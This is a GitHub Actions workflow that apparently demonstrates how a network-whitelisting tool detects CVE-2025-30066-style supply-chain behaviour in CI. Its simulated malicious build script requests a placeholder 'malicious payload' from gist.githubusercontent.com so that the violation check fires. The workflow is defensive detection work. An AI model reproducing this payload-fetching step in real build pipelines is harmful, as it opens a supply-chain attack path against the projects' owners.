name: CVE-2025-30066 Detection Demo
on: [workflow_dispatch]

jobs:
  demonstrate-cve-detection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      # Setup EDAMAME Posture with initial monitoring
      - name: Setup EDAMAME Posture
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          network_scan: true             # Enable network monitoring
          whitelist: github_linux        # Use GitHub Linux whitelist as base
          disconnected_mode: true        # Run without domain authentication

      - name: Create legitimate build script
        run: |
          # Create a simple Python script that represents a legitimate build process
          cat > build.py << EOF
          import subprocess
          import sys
          import requests

          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Download a legitimate dependency (from PyPI)
          print("Downloading requests library info from PyPI...")
          response = requests.get("https://pypi.org/pypi/requests/json")
          print(f"Downloaded PyPI info: {response.status_code}")
          
          # Run pip list (legitimate action)
          subprocess.run(["pip", "list"])
          
          print("Build completed successfully!")
          EOF

      - name: Run legitimate build process
        run: |
          # Install dependencies
          pip install requests
          
          # Run the build script
          python build.py

      # Create custom whitelist from legitimate traffic
      - name: Create whitelist from legitimate traffic
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          create_custom_whitelists: true       # Generate whitelist from observed traffic
          custom_whitelists_path: ./whitelist.json  # Save to this file

      # Apply the custom whitelist for enforcement
      - name: Apply custom whitelist
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          custom_whitelists_path: ./whitelist.json  # Load from this file
          set_custom_whitelists: true          # Apply the custom whitelist

      - name: Display whitelist content
        run: cat ./whitelist.json

      - name: Create malicious build script (simulating CVE-2025-30066)
        run: |
          # Create a Python script that simulates the malicious behavior from CVE-2025-30066
          # This script will attempt to connect to gist.githubusercontent.com - mimicking the attack vector
          cat > build_malicious.py << EOF
          import subprocess
          import sys
          import requests
          import os
          
          # Print Python version (legitimate action)
          print(f"Python version: {sys.version}")
          
          # Simulate the attack vector - connect to gist.githubusercontent.com
          # This is similar to what the compromised tj-actions/changed-files action did
          print("Attempting to fetch malicious payload from gist.githubusercontent.com...")
          try:
              response = requests.get("https://gist.githubusercontent.com/example/123456/raw/malicious.py")
              print(f"Downloaded malicious payload: {response.status_code}")
          except Exception as e:
              print(f"Error downloading malicious payload: {e}")
          
          # Continue with legitimate-looking actions
          subprocess.run(["pip", "list"])
          
          print("Build completed!")
          EOF

      - name: Run build process with simulated malicious behavior
        run: |
          # Run the malicious build script
          python build_malicious.py

      # Check for whitelist violations - this will fail if unauthorized connections were detected
      - name: Check for whitelist violations
        id: whitelist_check
        continue-on-error: true
        uses: edamametechnologies/edamame_posture_action@v0
        with:
          dump_sessions_log: true         # Dump the network session log
          whitelist_conformance: true     # Fail if network traffic violated the whitelist

      - name: Verify detection
        run: |
          if [ "${{ steps.whitelist_check.outcome }}" == "failure" ]; then
            echo "✅ SUCCESS: EDAMAME detected unauthorized connection to gist.githubusercontent.com"
            echo "This demonstrates how EDAMAME would have detected CVE-2025-30066"
            echo "The tj-actions/changed-files attack used this exact pattern to exfiltrate secrets"
          else
            echo "❌ FAILURE: EDAMAME did not detect the unauthorized connection"
            exit 1
          fi 